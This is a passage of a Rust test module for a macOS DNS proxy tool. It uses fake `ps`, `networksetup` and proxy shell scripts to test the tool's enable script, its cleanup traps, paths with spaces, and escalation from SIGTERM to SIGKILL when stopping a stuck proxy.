    /// Fake `ps` 基础设施（PR #164 review blocker #2）：sandboxed runners
    ///（Codex `sandbox-exec`、rootless containers 等）拒绝 `/bin/ps`，
    /// 让 `kill_proxy_via_pid_file` 内部 `Command::new("ps")` 返回 Err，
    /// helper 的 `_ => false` arm 把这折叠成 `PidReusedOrMismatch`，
    /// `#81` comm 校验测试集体 flake。
    ///
    /// 本 wrapper 在 `setup_fake_bin_env` 之上额外写一个 fake `ps` 到
    /// tempdir bin + 一个 `PID COMM` map 文件，把 map 文件路径 export 到
    /// `MHOST_TEST_PS_MAP_FILE`。fake `ps` sh 脚本按 `awk '$1 == p'`
    /// 在 map 里查找匹配 PID 的 comm 行，剥掉首字段后 print —— 模拟
    /// macOS 真实 `ps -p <pid> -o comm=` 的输出（带路径的 comm 字符串）。
    ///
    /// 调用方在 spawn 出子进程拿到 PID 后调 `append_ps_comm_map(pid, comm)`
    /// 把 PID→comm 写到 map（wrapper 不知道 spawn 时机）。对于不需要
    /// 关注 PID 的纯 legacy 测试，map 可为空 → fake `ps` 对任意 `-p`
    /// 都返回空 → 走 helper 的 `_ => false` 兜底（与"找不到 /bin/ps"
    /// 行为一致，仍是 conservative fail）。
    ///
    /// **契约**：
    ///   - 不破坏 `setup_fake_bin_env` 的对外签名 → 现有 4 个调用点不动
    ///   - 返回值与 `setup_fake_bin_env` 形状一致：`(TempDir, PathBuf)`
    ///   - 必须持 `serial_runtime_dir_test()` 锁（同 `setup_fake_bin_env`）
    ///   - 持 `EnvRestore::snapshot()` 让 `MHOST_TEST_PS_MAP_FILE` 跟着
    ///     PATH / MHOST_RUNTIME_DIR 一起 restore
    ///
    /// **fake ps sh 脚本接受的两类调用**（与 helper 兼容）：
    ///   - `ps -p <pid> -o comm=` → 查 map 找匹配行 print
    ///   - 无 `-p` 的 legacy form → 静默 no-op（不影响 helper；helper 只
    ///     调 `-p` form）
    #[cfg(target_os = "macos")]
    fn setup_fake_bin_env_with_ps(
        proxy_contents: &str,
        networksetup_contents: &str,
        pid_comm_overrides: &[(u32, &str)],
    ) -> (tempfile::TempDir, PathBuf) {
        use std::io::Write;
        use std::os::unix::fs::OpenOptionsExt;

        // 复用既有 fake-bin 基础设施（proxy + networksetup + PATH 前置）
        let (dir, bin) = setup_fake_bin_env(proxy_contents, networksetup_contents);

        // 写 fake `ps` 到 bin → 同一 PATH 前置会让 `Command::new("ps")`
        // resolve 到它。脚本 chmod 0o755 才能直接执行（helper 走
        // Command::new 不带 shebang path，所以可执行位必须设）。
        let ps_path = bin.join("ps");
        let ps_script = r#"#!/bin/sh
# Fake ps for sandboxed test runners (PR #164 review blocker #2).
# Reads MHOST_TEST_PS_MAP_FILE (lines: "<pid> <comm>") and prints
# comm for matching PID. Real macOS `ps -p <pid> -o comm=` returns
# the full path of the executable (e.g. /bin/sh for shell scripts),
# so we just print whatever comm the test registered.
case "$1" in
  -p)
    target_pid="$2"
    if [ -n "$MHOST_TEST_PS_MAP_FILE" ] && [ -f "$MHOST_TEST_PS_MAP_FILE" ]; then
      awk -v p="$target_pid" '$1 == p { $1=""; sub(/^ /, ""); print; found=1; exit } END { if (!found) exit 1 }' "$MHOST_TEST_PS_MAP_FILE"
    fi
    ;;
esac
exit 0
"#;
        {
            let mut f = std::fs::OpenOptions::new()
                .write(true)
                .create(true)
                .truncate(true)
                .mode(0o755)
                .open(&ps_path)
                .unwrap();
            f.write_all(ps_script.as_bytes()).unwrap();
            f.sync_all().unwrap();
        }

        // 写 PID→comm map 文件 + 暴露路径给 fake `ps` sh 脚本
        let map_path = dir.path().join("ps_comm_map.txt");
        {
            let mut map_content = String::new();
            for (pid, comm) in pid_comm_overrides {
                map_content.push_str(&format!(
                    "{pid} {comm}
"
                ));
            }
            std::fs::write(&map_path, map_content).unwrap();
        }
        std::env::set_var("MHOST_TEST_PS_MAP_FILE", &map_path);

        (dir, bin)
    }

    /// 把新 PID→comm 映射追加到 `MHOST_TEST_PS_MAP_FILE`（append 模式，
    /// 不破坏已有 entries）。
    ///
    /// 用法：`spawn_*_fake_proxy` 拿到 PID 后调用，让 fake `ps` 在该 PID
    /// 上能返回正确的 comm。多次 spawn（多 fake proxy 并存）也可。
    ///
    /// **必须**先调 `setup_fake_bin_env_with_ps`（它会 set
    /// `MHOST_TEST_PS_MAP_FILE` env var）；没设过就 panic（兜底防误用）。
    #[cfg(target_os = "macos")]
    fn append_ps_comm_map(pid: u32, comm: &str) {
        use std::io::Write;
        use std::os::unix::fs::OpenOptionsExt;
        let map_file = std::env::var("MHOST_TEST_PS_MAP_FILE").unwrap_or_else(|_| {
            panic!(
                "append_ps_comm_map called but MHOST_TEST_PS_MAP_FILE is unset;                  did you forget to call setup_fake_bin_env_with_ps first?"
            )
        });
        let mut f = std::fs::OpenOptions::new()
            .append(true)
            .create(true)
            .mode(0o600)
            .open(&map_file)
            .expect("open ps_comm_map for append");
        writeln!(f, "{pid} {comm}").expect("append to ps_comm_map");
        f.sync_all().expect("sync ps_comm_map");
    }

    /// 把 shell 脚本写到 0o700 temp 文件 + /bin/sh 执行，返回 `Output`。
    ///
    /// `name_prefix` 用于区分调用方（e.g. `"enable"` / `"old-buggy"`），避免
    /// 并发 test 之间文件名碰撞。文件名还包含 PID + nanos + 调用方 line!()
    /// 做 salt，确保真正并发也安全。
    #[cfg(target_os = "macos")]
    fn write_and_exec_script(name_prefix: &str, body: &str) -> std::process::Output {
        use std::io::Write;
        use std::os::unix::fs::OpenOptionsExt;
        use std::process::Command;

        let script_path = std::env::temp_dir().join(format!(
            "mhost-dns-{name_prefix}-{}-{}-{}.sh",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos(),
            line!(),
        ));
        let _ = std::fs::remove_file(&script_path);
        {
            let mut f = std::fs::OpenOptions::new()
                .write(true)
                .create_new(true)
                .mode(0o700)
                .open(&script_path)
                .unwrap();
            f.write_all(body.as_bytes()).unwrap();
            f.sync_all().unwrap();
        }
        let output = Command::new(&script_path).output().unwrap();
        let _ = std::fs::remove_file(&script_path);
        output
    }

    /// 把 `build_enable_script` 的输出写到 0o700 temp 文件 + /bin/sh 执行，
    /// 返回 `Output`。这是 5 个端到端测试的主入口。
    #[cfg(target_os = "macos")]
    fn exec_production_enable_script(inputs: &EnableScriptInputs) -> std::process::Output {
        let script_body = build_enable_script(inputs);
        write_and_exec_script("enable", &script_body)
    }

    /// 从 PID 文件读出 proxy PID 并 kill（SIGTERM → SIGKILL fallback）；happy-path
    /// 测试清理用。silent ignore（PID 文件可能已被 trap 清掉）。
    ///
    /// SIGTERM-first 是因为 `sleep`、Rust runtime 都默认响应 SIGTERM，能干净
    /// 退出（跑析构 / flush log）。如果目标进程 trap 了 SIGTERM 或已僵尸，
    /// 150ms 后升级到 SIGKILL。两次都 silent ignore（PID 已被 reap 返回 ESRCH）。
    #[cfg(target_os = "macos")]
    fn kill_proxy_from_pid_file(pid_file: &Path) {
        let Ok(content) = std::fs::read_to_string(pid_file) else {
            return;
        };
        let Some(pid_str) = content.split_whitespace().next() else {
            return;
        };
        let Ok(pid) = pid_str.parse::<i32>() else {
            return;
        };
        unsafe {
            libc::kill(pid, libc::SIGTERM);
        }
        std::thread::sleep(std::time::Duration::from_millis(150));
        // SIGTERM 不响应 / 进程已 zombie → 升级到 SIGKILL
        if unsafe { libc::kill(pid, 0) } == 0 {
            unsafe {
                libc::kill(pid, libc::SIGKILL);
            }
        }
    }

    // -----------------------------------------------------------------------
    // 端到端 happy path（issue #158 #1）
    //
    // fake proxy 长跑（模拟真实 proxy 启动后 bind + 服务 DNS）+
    // fake networksetup 写 args + 退出 0。
    //
    // 验证 production builder 产出的脚本：
    //   1. 退出 0
    //   2. PID 文件写入 + 格式正确（"PID FULL_PROXY_PATH\n"，#81 安全格式）
    //   3. fake networksetup 收到 -setdnsservers <IFACE> 127.0.0.1
    //   4. EXIT trap **disarm** 后 proxy + PID 文件都保留
    //      （kill -0 在记录的 PID 上成功，证明 proxy 还活着 = trap 没清）
    //   5. stderr 不含 "exited within 1s"（proxy 没被 kill -0 误杀）
    // -----------------------------------------------------------------------
    #[cfg(target_os = "macos")]
    #[test]
    fn test_enable_script_happy_path_with_fakes() {
        let _guard = serial_runtime_dir_test();
        let _env = EnvRestore::snapshot();

        // **fix #158**：tempdir prefix 不能含空格 —— PID file 解析用
        // `split_whitespace()`，fake_proxy 路径含空格会被切碎。路径含
        // 空格的场景在 `test_enable_script_end_to_end_with_spaces_in_paths`
        // 单独覆盖（那里 PID file 断言走 string contains，不依赖 split）。
        let dir = tempfile::Builder::new()
            .prefix("mhost-happy-path")
            .tempdir()
            .unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        // fake proxy 把自己的 PID 写到 marker file，便于 cleanup 验证
        let proxy_pid_marker = dir.path().join("fake_proxy.pid");
        let proxy_contents = format!(
            "#!/bin/sh\necho $$ > '{marker}'\nsleep 30\n",
            marker = proxy_pid_marker.to_string_lossy()
        );
        // fake networksetup 写 args 到 log + 退出 0
        let ns_log = dir.path().join("fake_ns.log");
        let ns_contents = format!(
            "#!/bin/sh\necho \"$@\" >> '{log}'\nexit 0\n",
            log = ns_log.to_string_lossy()
        );
        let (_bin_dir, bin_path) = setup_fake_bin_env(&proxy_contents, &ns_contents);

        let fake_proxy = bin_path.join("mhost-dns-proxy");
        let pid_file = proxy_pid_file();
        let log_path = dir.path().join("mhost-dns-proxy.log");

        let inputs = EnableScriptInputs {
            proxy_path: &fake_proxy,
            dns_port: 1053,
            pid_file: &pid_file,
            log_path: &log_path,
            interface: "Wi-Fi",
        };

        let output = exec_production_enable_script(&inputs);
        let stderr = String::from_utf8_lossy(&output.stderr);
        let stdout = String::from_utf8_lossy(&output.stdout);

        // 1. 脚本退出 0
        assert_eq!(
            output.status.code(),
            Some(0),
            "happy path should exit 0; got {:?}\nstderr={stderr}\nstdout={stdout}",
            output.status.code(),
        );

        // 2. PID 文件存在 + 格式 = "PID FULL_PROXY_PATH\n"
        assert!(pid_file.exists(), "F4: PID file must remain after success");
        let pid_content = std::fs::read_to_string(&pid_file).unwrap();
        let mut parts = pid_content.split_whitespace();
        let recorded_pid: u32 = parts.next().expect("PID").parse().expect("PID parse");
        let recorded_path = parts.next().expect("binary path in PID file");
        assert_eq!(
            recorded_path,
            fake_proxy.to_string_lossy(),
            "PID file must record FULL proxy path (fix #81 safe format)"
        );

        // 3. fake networksetup 收到正确 args
        let ns_log_content = std::fs::read_to_string(&ns_log).unwrap();
        assert!(
            ns_log_content.contains("-setdnsservers"),
            "fake networksetup must receive -setdnsservers flag; got: {ns_log_content:?}"
        );
        assert!(
            ns_log_content.contains("Wi-Fi"),
            "fake networksetup must receive interface name; got: {ns_log_content:?}"
        );
        assert!(
            ns_log_content.contains("127.0.0.1"),
            "fake networksetup must receive 127.0.0.1 target; got: {ns_log_content:?}"
        );

        // 4. EXIT trap 已 disarm —— recorded PID 必须还活着（proxy 还在 sleep）。
        //    必须在 kill cleanup **之前**做这个断言，否则 kill 把 proxy
        //    杀掉后 kill -0 当然失败，断言无意义。
        let alive = unsafe { libc::kill(recorded_pid as libc::pid_t, 0) == 0 };
        assert!(
            alive,
            "after happy-path success, recorded PID {recorded_pid} must still be alive \
             (proves EXIT trap was disarmed by `trap - EXIT` after networksetup)"
        );

        // 5. stderr 不应包含 Layer 2 失败信息
        assert!(
            !stderr.contains("exited within 1s"),
            "happy path should NOT trigger kill -0 failure; stderr={stderr}"
        );

        // 所有断言通过后，cleanup 残留 fake proxy（避免下一个 test 撞上 zombie）
        kill_proxy_from_pid_file(&pid_file);
    }

    // -----------------------------------------------------------------------
    // kill -0 捕获 proxy 立即退出（issue #158 #2）
    //
    // fake proxy 用 `exit 1` 立刻死（模拟 bind 53 失败 / 早期 panic /
    // 任何"启动后瞬间死掉"的场景）。
    //
    // 验证：
    //   1. 脚本退出 1（不是 0，**不是** silent failure）
    //   2. stderr 含 "exited within 1s" + log dump
    //   3. PID 文件被 EXIT trap 清掉（不留 orphan）
    // -----------------------------------------------------------------------
    #[cfg(target_os = "macos")]
    #[test]
    fn test_enable_script_kill_zero_catches_immediate_exit() {
        let _guard = serial_runtime_dir_test();
        let _env = EnvRestore::snapshot();

        let dir = tempfile::Builder::new()
            .prefix("mhost kill zero")
            .tempdir()
            .unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        // fake proxy 立刻死；写一行到 log 让 Layer 2 dump 出来能验证
        let proxy_contents = "#!/bin/sh\necho 'bind 53 failed: EADDRINUSE' >&2\nexit 1\n";
        let ns_contents = "#!/bin/sh\necho \"$@\" >> /dev/null\nexit 0\n";
        let (_bin_dir, bin_path) = setup_fake_bin_env(proxy_contents, ns_contents);

        let fake_proxy = bin_path.join("mhost-dns-proxy");
        let pid_file = proxy_pid_file();
        let log_path = dir.path().join("mhost-dns-proxy.log");

        let inputs = EnableScriptInputs {
            proxy_path: &fake_proxy,
            dns_port: 1053,
            pid_file: &pid_file,
            log_path: &log_path,
            interface: "Wi-Fi",
        };

        let output = exec_production_enable_script(&inputs);
        let stderr = String::from_utf8_lossy(&output.stderr);

        // 1. 退出码 != 0（关键回归 —— 旧脚本会退出 0，#155 silent failure）
        let code = output.status.code();
        assert!(
            code != Some(0),
            "script must exit non-zero when proxy dies; got {code:?}\nstderr={stderr}"
        );

        // 2. stderr 含 Layer 2 错误消息
        assert!(
            stderr.contains("exited within 1s"),
            "stderr must report kill -0 detection; got: {stderr}"
        );
        // log dump 应把 fake proxy 的 stderr 也带出来（"bind 53 failed"）
        assert!(
            stderr.contains("bind 53 failed"),
            "stderr must include log dump from failed proxy; got: {stderr}"
        );

        // 3. PID 文件被 EXIT trap 清掉
        assert!(
            !pid_file.exists(),
            "F4: PID file must be removed by EXIT trap on Layer 2 fail path"
        );
    }

    // -----------------------------------------------------------------------
    // networksetup 失败 → EXIT trap transactional cleanup（issue #158 #3）
    //
    // fake proxy 长跑成功（kill -0 通过）+ fake networksetup 失败
    // （模拟「proxy 真起来了但 DNS 切换被拒」场景）。
    //
    // 验证：
    //   1. 脚本退出非 0（propagate networksetup 的失败）
    //   2. EXIT trap 把**还在跑**的 proxy 杀掉（不留 orphan 占 53 端口）
    //   3. EXIT trap 把 PID 文件清掉
    //   4. fake networksetup 收到正确 args（确实被调到，不是早死）
    // -----------------------------------------------------------------------
    #[cfg(target_os = "macos")]
    #[test]
    fn test_enable_script_transactional_cleanup_on_networksetup_failure() {
        let _guard = serial_runtime_dir_test();
        let _env = EnvRestore::snapshot();

        let dir = tempfile::Builder::new()
            .prefix("mhost ns fail")
            .tempdir()
            .unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        // fake proxy 长跑 + 记录自己 PID（用于事后验证"已被 trap 清掉"）
        let proxy_pid_marker = dir.path().join("fake_proxy.pid");
        let proxy_contents = format!(
            "#!/bin/sh\necho $$ > '{marker}'\nsleep 30\n",
            marker = proxy_pid_marker.to_string_lossy()
        );
        // fake networksetup 写 args + 退出 1（模拟 setdnsservers 失败）
        let ns_log = dir.path().join("fake_ns.log");
        let ns_contents = format!(
            "#!/bin/sh\necho \"$@\" >> '{log}'\nexit 1\n",
            log = ns_log.to_string_lossy()
        );
        let (_bin_dir, bin_path) = setup_fake_bin_env(&proxy_contents, &ns_contents);

        let fake_proxy = bin_path.join("mhost-dns-proxy");
        let pid_file = proxy_pid_file();
        let log_path = dir.path().join("mhost-dns-proxy.log");

        let inputs = EnableScriptInputs {
            proxy_path: &fake_proxy,
            dns_port: 1053,
            pid_file: &pid_file,
            log_path: &log_path,
            interface: "Wi-Fi",
        };

        let output = exec_production_enable_script(&inputs);
        let stderr = String::from_utf8_lossy(&output.stderr);

        // 0. 先读 fake proxy PID —— 之后 trap 应该把它杀掉
        let proxy_pid_str = std::fs::read_to_string(&proxy_pid_marker)
            .expect("fake proxy should have recorded its PID");
        let proxy_pid: i32 = proxy_pid_str.trim().parse().expect("fake proxy PID parse");

        // 1. 脚本退出非 0
        let code = output.status.code();
        assert!(
            code != Some(0),
            "script must propagate networksetup failure; got {code:?}\nstderr={stderr}"
        );

        // 2. fake proxy 必须已被 trap kill 掉（kill -0 应该失败）。
        //    **不能**在此之前调 SIGKILL 兜底 —— 否则会遮盖「trap 没杀」的回归。
        let proxy_alive = unsafe { libc::kill(proxy_pid, 0) == 0 };
        assert!(
            !proxy_alive,
            "F4: EXIT trap must SIGTERM the proxy when networksetup fails; \
             but kill -0 on PID {proxy_pid} still succeeds"
        );

        // 3. PID 文件被 EXIT trap 清掉
        assert!(
            !pid_file.exists(),
            "F4: EXIT trap must rm -f the PID file on transactional cleanup"
        );

        // 4. fake networksetup 确实被调到（不是 Layer 1/2 早死）
        let ns_log_content = std::fs::read_to_string(&ns_log).unwrap();
        assert!(
            ns_log_content.contains("-setdnsservers"),
            "fake networksetup must have been called (proves script reached networksetup step); \
             log: {ns_log_content:?}"
        );

        // 所有断言通过后，**兜底** kill ——万一未来 trap 行为偏离预期，
        // 留个 zombie 也得清掉（这里 trap 已杀过，SIGKILL 是 no-op）。
        unsafe {
            libc::kill(proxy_pid, libc::SIGKILL);
        }
    }

    // -----------------------------------------------------------------------
    // 路径含空格端到端（issue #158 #4：覆盖「Production default path」
    // ~/Library/Application Support/mHost/...）
    //
    // runtime_dir / pid_file / log_path 全都含空格 + interface 含空格，
    // 跑 happy path，验证：
    //   1. 脚本退出 0（不被 word splitting 截断）
    //   2. PID 文件在带空格路径下**真的**被创建
    //   3. PID 文件内容包含完整带空格的 proxy 路径（路径没被切碎）
    //   4. fake networksetup 收到完整带空格的 interface 名
    // -----------------------------------------------------------------------
    #[cfg(target_os = "macos")]
    #[test]
    fn test_enable_script_end_to_end_with_spaces_in_paths() {
        let _guard = serial_runtime_dir_test();
        let _env = EnvRestore::snapshot();

        // Runtime_dir 用带空格前缀 → 所有 pid / log / shutdown file 都跟着带空格
        let dir = tempfile::Builder::new()
            .prefix("mhost runtime with spaces")
            .tempdir()
            .unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        // 进一步让 fake proxy 二进制本身路径也带空格（worst case）
        let bin_with_space = dir.path().join("fake bin dir");
        std::fs::create_dir_all(&bin_with_space).unwrap();

        let proxy_contents = "#!/bin/sh\nsleep 30\n";
        let ns_log = dir.path().join("fake_ns.log");
        let ns_contents = format!(
            "#!/bin/sh\necho \"$@\" >> '{log}'\nexit 0\n",
            log = ns_log.to_string_lossy()
        );

        let bin_path = bin_with_space.clone();
        for (name, contents) in [
            ("mhost-dns-proxy", proxy_contents),
            ("networksetup", ns_contents.as_str()),
        ] {
            let path = bin_path.join(name);
            use std::io::Write;
            use std::os::unix::fs::OpenOptionsExt;
            let mut f = std::fs::OpenOptions::new()
                .write(true)
                .create(true)
                .truncate(true)
                .mode(0o755)
                .open(&path)
                .unwrap();
            f.write_all(contents.as_bytes()).unwrap();
        }
        // PATH 加 fake bin 前面
        let original_path = std::env::var("PATH").unwrap_or_default();
        std::env::set_var(
            "PATH",
            format!("{}:{}", bin_with_space.display(), original_path),
        );

        let fake_proxy = bin_path.join("mhost-dns-proxy");
        // PID file 在 runtime_dir（已经带空格），log path 也带空格
        let pid_file = proxy_pid_file();
        let log_path = dir.path().join("log file with space.log");
        let interface_with_space = "Thunderbolt Ethernet";

        let inputs = EnableScriptInputs {
            proxy_path: &fake_proxy,
            dns_port: 1053,
            pid_file: &pid_file,
            log_path: &log_path,
            interface: interface_with_space,
        };

        let output = exec_production_enable_script(&inputs);
        let stderr = String::from_utf8_lossy(&output.stderr);
        let stdout = String::from_utf8_lossy(&output.stdout);

        kill_proxy_from_pid_file(&pid_file);

        // 1. 退出 0
        assert_eq!(
            output.status.code(),
            Some(0),
            "spaces-in-path happy path should exit 0; got {:?}\nstderr={stderr}\nstdout={stdout}",
            output.status.code()
        );

        // 2. PID 文件真的在带空格路径下被创建出来
        assert!(
            pid_file.exists(),
            "F2: PID file must exist at the path-with-spaces; path={:?}",
            pid_file
        );

        // 3. PID 文件内容含完整带空格 proxy 路径（路径没被切碎）
        let pid_content = std::fs::read_to_string(&pid_file).unwrap();
        assert!(
            pid_content.contains(fake_proxy.to_string_lossy().as_ref()),
            "F2: PID file must contain FULL proxy path with spaces; got: {pid_content:?}"
        );

        // 4. fake networksetup 收到完整带空格 interface
        let ns_log_content = std::fs::read_to_string(&ns_log).unwrap();
        assert!(
            ns_log_content.contains("Thunderbolt Ethernet"),
            "F2: fake networksetup must receive FULL interface name with spaces; got: {ns_log_content:?}"
        );
    }

    // -----------------------------------------------------------------------
    // #155 silent-failure 文档测试（issue #158 #5）
    //
    // 手工拼出 #155 修复**之前**的 enable 脚本形式（无 [ -x ]、无
    // kill -0、无 EXIT trap），跑同样的 fake proxy + fake networksetup：
    //
    //   - fake proxy = `exit 1`（bind 失败模拟）
    //   - fake networksetup = 退出 0
    //
    // 验证旧脚本确实有 silent failure：
    //   - 退出 0（脚本认为"enable 成功"）
    //   - PID 文件**存在**但里面记录的 PID **不存活**（proxy 没真起来）
    //   - 系统 DNS 被切到 127.0.0.1，但 53 端口实际没 listener
    //
    // **注意**：本测试**不**是 regression guard。如果 production builder
    // 退回旧 `set -e + cmd & echo "$! ..."` 形式，已经由
    // `test_pid_file_content_format` / `test_enable_script_contains_safety_layers`
    // 这两个结构测试 catch（它们直接断言 `[ -x ]` / `kill -0` /
    // `trap cleanup EXIT` / `PROXY_PID` 命名变量等结构特征 —— 这些
    // 在旧形式中全部缺席）。
    //
    // 本测试的价值是 **pedagogical**：把 #155 的 silent failure 模式
    // 具象化为一个可运行 demo，让后续维护者能直观看到「如果不修，
    // 会发生什么」，降低对 issue 描述的依赖。
    // -----------------------------------------------------------------------
    #[cfg(target_os = "macos")]
    #[test]
    fn test_old_buggy_script_silently_succeeds_with_dead_pid() {
        let _guard = serial_runtime_dir_test();
        let _env = EnvRestore::snapshot();

        let dir = tempfile::Builder::new()
            .prefix("mhost old buggy")
            .tempdir()
            .unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        // fake proxy: 立刻 exit（bind 失败模拟）
        let proxy_contents = "#!/bin/sh\nexit 1\n";
        let ns_log = dir.path().join("fake_ns.log");
        let ns_contents = format!(
            "#!/bin/sh\necho \"$@\" >> '{log}'\nexit 0\n",
            log = ns_log.to_string_lossy()
        );
        let (_bin_dir, bin_path) = setup_fake_bin_env(proxy_contents, &ns_contents);
        let fake_proxy = bin_path.join("mhost-dns-proxy");

        // 手工拼出 #155 修复**之前**的 buggy enable 脚本。
        // 缺：no [ -x ] pre-check / no kill -0 post-launch / no EXIT trap /
        // no networksetup-after-kill-zero ordering / no transactional cleanup。
        let pid_file = dir.path().join("pid file");
        let log_path = dir.path().join("log file");
        let buggy_script = format!(
            r#"#!/bin/sh
set -e
PROXY='{proxy}'
PID_FILE='{pid_file}'
LOG_FILE='{log}'
IFACE='{iface}'

# Old behavior: trust `&` swallow the exit code, no detection layer
"$PROXY" --listen 53 --target 1053 >"$LOG_FILE" 2>&1 &
PID=$!
echo "$PID $PROXY" > "$PID_FILE"

# Old: no kill -0, no EXIT trap, just trust
networksetup -setdnsservers "$IFACE" 127.0.0.1
"#,
            proxy = fake_proxy.to_string_lossy(),
            pid_file = pid_file.to_string_lossy(),
            log = log_path.to_string_lossy(),
            iface = "Wi-Fi",
        );

        let output = write_and_exec_script("old-buggy", &buggy_script);
        let stderr = String::from_utf8_lossy(&output.stderr);

        // 关键断言 #1：旧脚本退出 0（silent failure！）
        assert_eq!(
            output.status.code(),
            Some(0),
            "演示 #155 的 silent failure 模式：旧脚本应该退出 0；got {:?} stderr={stderr}",
            output.status.code(),
        );

        // 关键断言 #2：PID 文件被写了（旧脚本信任 `&` 的 PID）
        assert!(
            pid_file.exists(),
            "旧脚本应该会把 `$!` 写到文件，演示 PID file 撒谎；got 不存在"
        );
        let pid_content = std::fs::read_to_string(&pid_file).unwrap();
        let recorded_pid: u32 = pid_content
            .split_whitespace()
            .next()
            .expect("PID")
            .parse()
            .expect("PID parse");

        // 关键断言 #3：记录的 PID **不存活** —— 这就是 silent failure：
        // 文件说有 proxy 在跑，实际 proxy 早就 exit 了，53 端口没 listener。
        // 这是 #158 整个 issue 想防止的失败模式。
        let recorded_alive = unsafe { libc::kill(recorded_pid as libc::pid_t, 0) == 0 };
        assert!(
            !recorded_alive,
            "演示 silent failure：PID file 记录 PID {recorded_pid}，但这个进程早死了；\
             旧 production builder 的 silent failure 在这里表现为：exit 0 + PID file 撒谎。"
        );

        // sanity check：fake networksetup 真的被调到（说明脚本跑完了，不是早期死）
        let ns_log_content = std::fs::read_to_string(&ns_log).unwrap();
        assert!(
            ns_log_content.contains("-setdnsservers"),
            "fake networksetup 必须被调到（说明旧脚本完整跑完了 enable 流程）；got: {ns_log_content:?}"
        );
    }

    // -----------------------------------------------------------------------
    // issue #163 — disable-time SIGKILL 兜底
    //
    // Bug 复现：disable 路径 5s 超时后，proxy 还占着 53/UDP。
    // `kill_proxy_via_pid_file` 是修复的核心 helper；本节测试其契约。
    //
    // 与 #158 同款测试套路：写 fake 二进制到 tempdir 的 bin/，加进 PATH，
    // 通过 spawn 真实进程（不 mock signal）。每个测试拿自己的 tempdir +
    // serial_runtime_dir_test 锁 + EnvRestore，避免污染全局 env。
    // -----------------------------------------------------------------------

    /// 起一个 fake "stuck" proxy：trap SIGTERM + sleep，让 SIGTERM 不响应
    /// （issue #163 的根因）。返回子进程 handle。
    ///
    /// **实现细节**：用 `/bin/sh` 当 fake binary，因为 shell 脚本经 shebang
    /// 启动后 `ps -o comm=` 返回解释器路径（macOS 行为）。所以 PID 文件的
    /// `recorded_binary` 必须是 `/bin/sh`，expected_comm = "sh"，ps 返回的
    /// basename 也是 "sh"，才能通过 #81 精确匹配。生产环境 proxy 是编译后
    /// 的 Mach-O 二进制，`ps` 直接返回 binary 路径，不需要这层对齐。
    #[cfg(target_os = "macos")]
    fn spawn_stuck_fake_proxy(marker_file: &Path) -> std::process::Child {
        let contents = format!(
            "trap '' TERM\n\
             echo $$ > '{marker}'\n\
             sleep 30 &\n\
             wait $!\n",
            marker = marker_file.to_string_lossy()
        );
        std::process::Command::new("/bin/sh")
            .args(["-c", &contents])
            .spawn()
            .expect("spawn stuck proxy")
    }

    /// 等 marker 文件出现并 parse 出 PID。最多等 2 秒。
    #[cfg(target_os = "macos")]
    fn wait_for_proxy_pid(marker: &Path) -> u32 {
        for _ in 0..100 {
            if let Ok(content) = std::fs::read_to_string(marker) {
                if let Ok(pid) = content.trim().parse::<u32>() {
                    return pid;
                }
            }
            std::thread::sleep(std::time::Duration::from_millis(20));
        }
        panic!("fake proxy didn't write PID marker in time");
    }

    /// 起一个 cooperative fake proxy（响应 SIGTERM，没有 trap）。用于
    /// 验证 SIGTERM 单独就够的场景。同样以 /bin/sh 启动，PID 文件的
    /// `recorded_binary` 用 `/bin/sh` 才能通过 #81 comm 匹配。
    #[cfg(target_os = "macos")]
    fn spawn_cooperative_fake_proxy(marker_file: &Path) -> std::process::Child {
        let contents = format!(
            "echo $$ > '{marker}'\n\
             sleep 30 &\n\
             wait $!\n",
            marker = marker_file.to_string_lossy()
        );
        std::process::Command::new("/bin/sh")
            .args(["-c", &contents])
            .spawn()
            .expect("spawn cooperative proxy")
    }

    /// bug 复现：stuck proxy trap SIGTERM → SIGKILL 升级必须生效
    #[cfg(target_os = "macos")]
    #[test]
    fn test_kill_proxy_via_pid_file_stuck_proxy_sigkill_escalates() {
        let _guard = serial_runtime_dir_test();
        let _env = EnvRestore::snapshot();
        let dir = tempfile::Builder::new()
            .prefix("mhost-issue-163-stuck")
            .tempdir()
            .unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        // PR #164 review (blocker #2): sandboxed runners deny `/bin/ps`.
        // Install fake `ps` so helper's comm check returns the right comm
        // for the spawned `/bin/sh` interpreter. Recorded in PID file as
        // `/bin/sh` → fake `ps` returns `/bin/sh` → basename = `sh` matches.
        let (_fake_bin_dir, _fake_bin_path) =
            setup_fake_bin_env_with_ps("#!/bin/sh\nexit 0\n", "#!/bin/sh\nexit 0\n", &[]);
        let pid_marker = dir.path().join("fake_proxy.pid");

        let mut child = spawn_stuck_fake_proxy(&pid_marker);
        let stuck_pid = wait_for_proxy_pid(&pid_marker);
        append_ps_comm_map(stuck_pid, "/bin/sh");

        // 写 PID 文件成 #81 格式：recorded_binary 必须是 `/bin/sh`（spawn 时
        // 的实际解释器），因为 shell 脚本经 shebang 启动后 `ps -o comm=` 返回
        // `/bin/sh`。
        let pid_file = proxy_pid_file();
        std::fs::write(&pid_file, format!("{stuck_pid} /bin/sh\n")).unwrap();

        // Act
        let outcome = kill_proxy_via_pid_file(&pid_file);

        // Assert 1: 进程必须死了（SIGKILL 升级生效）
        assert_eq!(outcome, KillOutcome::Killed, "stuck proxy 必须被强退");
        // reap zombie 才能让 PID 真正释放（生产中 proxy 的父进程是
        // osascript-spawned sh，最终 reap；测试里 cargo test 是父进程）
        let _ = child.wait();
        let still_alive = unsafe { libc::kill(stuck_pid as libc::pid_t, 0) == 0 };
        assert!(
            !still_alive,
            "stuck proxy (pid {stuck_pid}) 必须被 SIGKILL，但还活着"
        );

        // helper 不删 PID 文件 —— caller 自己清（contract）
        assert!(pid_file.exists(), "helper 不应删 PID 文件（caller 自己清）");
        let _ = std::fs::remove_file(&pid_file);
    }

    /// PID 文件指向已死 PID：安全返回 PidDeadAlready，不发任何信号
    #[cfg(target_os = "macos")]
    #[test]
    fn test_kill_proxy_via_pid_file_pid_dead() {
        let _guard = serial_runtime_dir_test();
        let _env = EnvRestore::snapshot();
        let dir = tempfile::Builder::new()
